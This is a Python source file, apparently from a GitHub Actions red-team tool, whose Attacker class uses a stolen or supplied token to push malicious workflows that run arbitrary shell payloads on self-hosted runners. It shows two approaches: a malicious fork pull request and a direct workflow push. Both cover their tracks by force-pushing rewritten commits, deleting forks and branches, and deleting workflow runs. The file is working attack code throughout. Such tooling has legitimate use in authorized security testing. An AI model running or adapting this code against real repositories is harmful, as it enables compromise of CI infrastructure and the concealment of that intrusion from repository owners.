import logging
import time
import random
import string

from gato.github import Api
from gato.git import Git
from gato.attack import CICDAttack
from gato.cli import bright

logger = logging.getLogger(__name__)
logging.root.setLevel(logging.DEBUG)


class Attacker:
    """Class holding all high level logic for executing attacks on self-hosted
    runners.
    """

    def __init__(
        self,
        output,
        pat: str,
        socks_proxy: str = None,
        http_proxy: str = None,
        author_email: str = None,
        author_name: str = None,
        timeout: int = 30
    ):

        self.api = Api(
            output,
            pat,
            socks_proxy=socks_proxy,
            http_proxy=http_proxy,
        )

        self.socks_proxy = socks_proxy
        self.http_proxy = http_proxy
        self.user_perms = None
        self.author_email = author_email
        self.author_name = author_name
        self.timeout = timeout
        self.output = output

    def __setup_user_info(self):
        if not self.user_perms:
            self.user_perms = self.api.check_user()
            if not self.user_perms:
                logger.error("This token cannot be used for attacks!")
                return False

            if self.author_email is None:
                self.author_email = \
                    f"{self.user_perms['user']}@users.noreply.github.com"

            if self.author_name is None:
                self.author_name = self.user_perms['name']

            self.output.info(
                "The authenticated user is: "
                f"{bright(self.user_perms['user'])}"
            )
            self.output.info(
                "The GitHub Classic PAT has the following scopes: "
                f'{", ".join(self.user_perms["scopes"])}'
            )

        return True

    def fork_pr_attack(self, target_repo: str, target_branch: str,
                       pr_title: str, source_branch: str, payload: str,
                       custom_workflow: str,
                       commit_message: str,
                       yaml_name: str = "sh_cicd_attack",
                       workflow_name: str = "Testing"):
        """Creates a malicious fork pull request against a public repository.

        Args:
            target_repo (str): Target repository, this is the one the pull
            request will be opened against.
            target_branch (str): Branch within the target repository for the
            pull request.
            pr_title (str): Title of the pull request.
            source_branch (str): Source branch in the repository that we
            control.
            payload (str): Shell script that will execute.
            custom_workflow (str): A custom YAML workflow that will be utilized
            instead of a shell payload.
            yaml_name (str, optional): Name of the YAML file that will be saved
            to the source branch. Defaults to
            "sh_cicd_attack".
            workflow_name (str, optional): Name of the workflow, this will
            appear in the actions tab. Defaults to
            "Testing".
        """

        self.__setup_user_info()

        if not self.user_perms:
            return False

        if 'repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes']:

            self.output.info(
                f"Conducting an attack against {bright(target_repo)} as the "
                f"user: {bright(self.user_perms['user'])}!"
            )

            res = self.api.get_repo_branch(target_repo, target_branch)
            if res == 0:
                self.output.error(f"Target branch, {target_branch}, does not exist!")
                return False
            elif res == -1:
                self.output.error("Failed to check for target branch!")
                return False

            repo_name = self.api.fork_repository(target_repo)
            if not repo_name:
                self.output.error("Error while forking repository!")
                return False

            for i in range(self.timeout):
                status = self.api.get_repository(repo_name)
                if status:
                    self.output.result(f"Successfully created fork: {repo_name}!")
                    time.sleep(5)
                    break
                else:
                    time.sleep(1)

            if not status:
                self.output.error(
                    f"Forked repository not found after {self.timeout} seconds!"
                )
                return False

            cloned_repo = Git(
                self.api.pat,
                repo_name,
                proxies=self.api.proxies,
                username=self.author_name,
                email=self.author_email
            )

            for i in range(self.timeout):
                status = cloned_repo.perform_clone()
                if status:
                    break
                else:
                    time.sleep(1)

            if not status:
                self.output.error("Error cloning forked repository!")
                return False

            if custom_workflow:
                with open(custom_workflow, 'r') as custom_wf:
                    yaml_contents = custom_wf.read()
            else:
                yaml_contents = CICDAttack.create_malicious_yml(
                    payload, workflow_name=workflow_name
                )

            status = cloned_repo.commit_file(
                yaml_contents.encode(),
                f".github/workflows/{yaml_name}.yml",
                message=commit_message
            )
            if not status:
                self.output.error("Failed to commit the malicious workflow locally!")
                return False

            status = cloned_repo.push_repository(source_branch)
            if not status:
                self.output.error("Unable push change!")

            if target_branch is None:
                target_branch = 'main'

            pr_url = self.api.create_fork_pr(
                target_repo,
                self.user_perms['user'],
                source_branch,
                target_branch,
                pr_title
            )

            if pr_url:
                self.output.result(
                    "Successfully created a PR! It can be viewed at: "
                    f"{bright(pr_url)}"
                )

                rebase_status = cloned_repo.rewrite_commit()

                if rebase_status:
                    self.output.result("Successfully rebased commit")

                    push_status = cloned_repo.push_repository(
                        source_branch,
                        force=True
                    )

                    if push_status:
                        self.output.result("Pushed commit to close PR!")

            else:
                self.output.error("Failed to create a PR for the fork!")

            success = self.api.delete_repository(repo_name)
            if success:
                self.output.result("Successfully deleted the fork!")
            else:
                self.output.error("Failed to delete the fork!")
        else:
            self.output.error(
                "The user does not have the necessary scopes to conduct this "
                "attack!"
            )

    def shell_workflow_attack(
            self, target_repo,
            payload: str,
            custom_workflow: str,
            target_branch: str,
            commit_message: str,
            delete_action: bool,
            yaml_name: str = "sh_cicd_attack"):

        self.__setup_user_info()

        if not self.user_perms:
            return False

        if 'repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes']:

            self.output.info(
                    f"Will be conducting an attack against {bright(target_repo)} as"
                    f" the user: {bright(self.user_perms['user'])}!"
            )

            cloned_repo = Git(
                self.api.pat,
                target_repo,
                proxies=self.api.proxies,
                username=self.author_name,
                email=self.author_email
            )
            cloned_repo.perform_clone()

            # Randomly generate a branch name, since this will run immediately
            # otherwise it will fail at the push.
            if target_branch is None:
                branch = ''.join(random.choices(
                    string.ascii_lowercase, k=10))
            else:
                branch = target_branch

            res = self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                self.output.error("Failed to check for remote branch!")
                return
            elif res == 1:
                self.output.error(f"Remote branch, {branch}, already exists!")
                return

            if custom_workflow:
                with open(custom_workflow, 'r') as custom_wf:
                    yaml_contents = custom_wf.read()
            else:
                yaml_contents = CICDAttack.create_push_yml(
                    payload, branch
                )

            rev_hash = cloned_repo.commit_file(
                yaml_contents.encode(),
                f".github/workflows/{yaml_name}.yml",
                message=commit_message
            )

            if rev_hash is None:
                self.output.error("Failed to commit the malicious workflow locally!")
                return

            status = cloned_repo.push_repository(branch)

            if not status:
                self.output.error("Failed to push the malicious workflow!")
                return

            self.output.result("Succesfully pushed the malicious workflow!")

            ret = cloned_repo.delete_branch(branch)

            if ret:
                self.output.result("Malicious branch deleted.")
            else:
                self.output.error(f"Failed to delete the branch: {branch}.")

            self.output.tabbed("Waiting for the workflow to queue...")

            for i in range(self.timeout):
                workflow_id = self.api.get_recent_workflow(target_repo, rev_hash)
                if workflow_id == -1:
                    self.output.error("Failed to find the created workflow!")
                    return
                elif workflow_id > 0:
                    break
                else:
                    time.sleep(1)
            else:
                self.output.error("Failed to find the created workflow!")
                return

            self.output.tabbed("Waiting for the workflow to execute...")

            for i in range(self.timeout):
                status = self.api.get_workflow_status(target_repo, workflow_id)
                if status == -1:
                    self.output.error("The workflow failed!")
                    break
                elif status == 1:
                    self.output.result("The malicious workflow executed succesfully!")
                    break
                else:
                    time.sleep(1)
            else:
                self.output.error("The workflow is incomplete but hit the timeout!")

            res = self.api.download_workflow_logs(target_repo, workflow_id)
            if not res:
                self.output.error("Failed to download logs!")
            else:
                self.output.result(f"Workflow logs downloaded to {workflow_id}.zip!")

            if delete_action:
                res = self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    self.output.error("Failed to delete workflow!")
                else:
                    self.output.result("Workflow deleted sucesfully!")
        else:
            self.output.error(
                "The user does not have the necessary scopes to conduct this "
                "attack!")
